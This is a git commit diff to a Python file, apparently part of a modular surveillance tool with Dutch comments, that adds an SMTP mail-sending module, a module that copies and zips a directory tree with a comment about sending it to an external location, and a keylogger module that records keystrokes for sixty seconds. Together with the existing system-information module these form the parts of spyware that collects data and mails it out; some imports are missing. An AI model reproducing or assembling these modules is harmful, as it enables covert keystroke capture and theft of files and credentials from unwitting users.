a781ff58323e8221117f73e87f9b7c096a868542
Blerta <91467900+BlertaJashanica@users.noreply.github.com>
2023-06-03 22:00:20 +0200

    add file

--- modules.py
+++ modules.py
@@ -2,10 +2,16 @@ import os
 import platform
 import socket
 import psutil
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+import shutil
+import zipfile
+
 
 class Module:
     def __init__(self):
-        pass
+        self.logmessage = ""
 
     def run():
         pass
@@ -52,11 +58,159 @@ class InfoModule(Module):
 
 
     def log(self, data ):
-        output = ""
         for key, value in data.items():
-           output += str(key) + ": " + str(value) + "\n"
-        return output
+           self.logmessage += str(key) + ": " + str(value) + "\n"
+        return self.logmessage
 
+
+
+class MailModule(Module):
+    def __init__(self):
+        super().__init__()
+
+    
+    def run(self):
+        # Verbindingsinstellingen voor de SMTP-server
+        smtp_server = 'smtp.example.com'
+        smtp_port = 587
+        username = 'your_username'
+        password = 'your_password'
+
+        # E-mailgegevens
+        sender = 'your_email@example.com'
+        recipient = 'recipient@example.com'
+        subject = 'Test Email'
+        message = 'Dit is een testbericht.'
+
+        # Het e-mailbericht opstellen
+        email = MIMEMultipart()
+        email['From'] = sender
+        email['To'] = recipient
+        email['Subject'] = subject
+
+        email.attach(MIMEText(message, 'plain'))
+        server = None
+        # SMTP-verbinding maken en e-mail verzenden
+        try:
+            server = smtplib.SMTP(smtp_server, smtp_port)
+            server.starttls()
+            server.login(username, password)
+            server.sendmail(sender, recipient, email.as_string())
+            self.logmessage += 'E-mail succesvol verzonden!'
+        except Exception as e:
+            self.logmessage += 'Er is een fout opgetreden bij het verzenden van de e-mail:', str(e)
+        finally:
+            if server is not None:
+                server.quit()
+
+    def log(self):
+        return self.logmessage
+
+class DiskModule(Module):
+    def __init__(self):
+        super().__init__()
+
+
+    def run(self):
+        source_path = '/pad/naar/bronmap'
+        destination_path = '/pad/naar/doelmap'
+
+        zip_file = self.analyze_disk_structure(source_path, destination_path)
+        if zip_file:
+            self.logmessage += 'Schijfstructuur succesvol geanalyseerd en gecomprimeerd: \n'
+        else:
+            self.logmessage += 'Fout bij het analyseren van de schijfstructuur.\n'
+
+
+    def analyze_disk_structure(self, source_path, destination_path):
+        # Maak een tijdelijke map voor de verzamelde gegevens
+        temp_path = os.path.join(destination_path, 'temp')
+        os.makedirs(temp_path, exist_ok=True)
+
+        try:
+            # Loop door de bronmap en kopieer alle bestanden en mappen naar de tijdelijke map
+            for root, dirs, files in os.walk(source_path):
+                # Maak de bijbehorende mapstructuur in de tijdelijke map
+                for directory in dirs:
+                    os.makedirs(os.path.join(temp_path, os.path.relpath(root, source_path), directory), exist_ok=True)
+
+                # Kopieer de bestanden naar de tijdelijke map
+                for file in files:
+                    shutil.copy2(os.path.join(root, file), os.path.join(temp_path, os.path.relpath(root, source_path), file))
+
+            # Maak een ZIP-archief van de tijdelijke map
+            zip_file_path = os.path.join(destination_path, 'disk_structure.zip')
+            with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
+                for root, dirs, files in os.walk(temp_path):
+                    for file in files:
+                        file_path = os.path.join(root, file)
+                        zipf.write(file_path, os.path.relpath(file_path, temp_path))
+
+            # Verstuur het ZIP-archief naar een externe locatie of sla het lokaal op
+            # Hier kun je de code toevoegen om de ZIP-archiefbestand door te sturen naar een externe locatie
+
+            # Verwijder de tijdelijke map
+            shutil.rmtree(temp_path)
+
+            return zip_file_path
+
+        except Exception as e:
+            # Handel eventuele fouten af
+            self.logmessage += 'Fout bij het analyseren van de schijfstructuur: \n'
+            return None
+
+            
+    def log(self):
+        return self.logmessage
+    
+
+class KeyModule(Module):
+    def __init__(self):
+        self.logged_keys = []
+        self.listener = None
+        
+    def on_key_press(self, key):
+        try:
+            key_char = key.char
+            self.logged_keys.append(key_char)
+        except AttributeError:
+            special_key = self.get_special_key_name(key)
+            self.logged_keys.append(f'[{special_key}]')
+        
+    def get_special_key_name(self, key):
+        if key == keyboard.Key.space:
+            return 'Space'
+        elif key == keyboard.Key.enter:
+            return 'Enter'
+        elif key == keyboard.Key.backspace:
+            return 'Backspace'
+        elif key == keyboard.Key.tab:
+            return 'Tab'
+        # Voeg hier extra speciale toetsen toe als dat nodig is
+        
+        # Als de speciale toets niet wordt herkend, retourneer gewoon de naam van de toets
+        return str(key)
+        
+    def start_logging(self):
+        self.listener = keyboard.Listener(on_press=self.on_key_press)
+        self.listener.start()
+        
+    def stop_logging(self):
+        self.listener.stop()
+        self.listener.join()
+        
+    def get_logged_keys(self):
+        return ''.join(self.logged_keys)
+
+    def run(self):
+        self.start_logging()
+        time.sleep(60)  # 60 seconden
+        self.stop_logging()
+        logged_keys = self.get_logged_keys()
+        self.logmessage += "Logged Keys:" +  logged_keys
+
+    def log(self):
+        return self.logmessage
 
 
 
